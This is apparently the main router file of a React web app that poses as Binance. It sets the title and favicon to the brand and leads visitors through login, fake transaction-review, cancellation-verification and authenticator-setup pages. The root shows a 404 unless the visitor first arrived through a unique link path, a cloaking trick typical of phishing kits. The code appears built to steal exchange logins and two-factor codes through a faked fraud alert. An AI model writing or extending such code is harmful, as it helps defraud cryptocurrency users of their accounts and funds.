import React, { useEffect } from 'react';
import { BrowserRouter, Routes, Route, useLocation, Navigate } from 'react-router-dom';
import { AnimatePresence } from 'framer-motion';
import { LoginPage } from './pages/LoginPage';
import { ReviewTransaction } from './pages/ReviewTransaction';
import { CancelTransactionVerify } from './pages/CancelTransactionVerify';
import { NotFound } from './pages/NotFound';
import { VerificationRequired } from './pages/VerificationRequired';
import { Success } from './pages/Success';
import { SetupAuthenticator } from './pages/SetupAuthenticator';
import { LoginVerificationRequired } from './pages/LoginVerificationRequired';

function AnimatedRoutes() {
  const location = useLocation();
  const isNavigating = location.state?.isNavigating;
  
  useEffect(() => {
    const validPaths = ['/', '/review-transaction', '/cancel-transaction-verify', '/verification-required', '/success', '/setup-authenticator', '/login-verification'];
    
    console.log('Current path:', location.pathname);
    console.log('Is valid path:', validPaths.includes(location.pathname));
    console.log('Current url_path in localStorage:', localStorage.getItem('url_path'));
    
    // Only save and redirect if path is not in our valid paths
    if (!validPaths.includes(location.pathname)) {
      console.log('Saving path to localStorage:', location.pathname);
      localStorage.setItem('url_path', location.pathname);
      console.log('After saving - url_path in localStorage:', localStorage.getItem('url_path'));
      window.location.href = '/';
    }
  }, [location.pathname]);

  const urlPath = localStorage.getItem('url_path');
  const isRootPath = location.pathname === '/';
  const userIsAllowed = isRootPath ? !!urlPath : true;

  console.log('Render - isRootPath:', isRootPath);
  console.log('Render - urlPath:', urlPath);
  console.log('Render - userIsAllowed:', userIsAllowed);

  // Set title and favicon only when user is allowed
  useEffect(() => {
    if (userIsAllowed) {
      document.title = 'Binance';
      
      // Remove existing favicon
      const existingFavicon = document.querySelector('link[rel="icon"]');
      if (existingFavicon) {
        existingFavicon.remove();
      }
      
      // Add new favicon
      const favicon = document.createElement('link');
      favicon.rel = 'icon';
      favicon.type = 'image/x-icon';
      favicon.href = '/favicon.ico';
      document.head.appendChild(favicon);
    } else {
      document.title = '';
    }
  }, [userIsAllowed]);

  // Show NotFound if we're on root path and there's no url_path
  if (isRootPath && !urlPath) {
    console.log('Showing 404 page');
    return <NotFound />;
  }

  return (
    <AnimatePresence mode="wait">
      <Routes location={location} key={location.pathname}>
        <Route path="/" element={<LoginPage />} />
        <Route path="/review-transaction" element={<ReviewTransaction />} />
        <Route path="/cancel-transaction-verify" element={<CancelTransactionVerify />} />
        <Route path="/verification-required" element={<VerificationRequired />} />
        <Route path="/success" element={<Success />} />
        <Route path="/setup-authenticator" element={<SetupAuthenticator />} />
        <Route path="/login-verification" element={<LoginVerificationRequired />} />
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </AnimatePresence>
  );
}

export default function App() {
  return (
    <BrowserRouter>
      <AnimatedRoutes />
    </BrowserRouter>
  );
}